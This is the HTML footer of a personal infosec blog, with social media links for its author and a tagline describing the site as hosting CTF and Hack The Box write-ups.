      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://www.facebook.com/Ahm3d.H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#facebook"></use></svg> <span class="username">Ahm3d.H3sham</span></a></li><li><a href="https://github.com/0xRick"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">0xRick</span></a></li><li><a href="https://www.twitter.com/Ahm3d_H3sham"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">Ahm3d_H3sham</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>

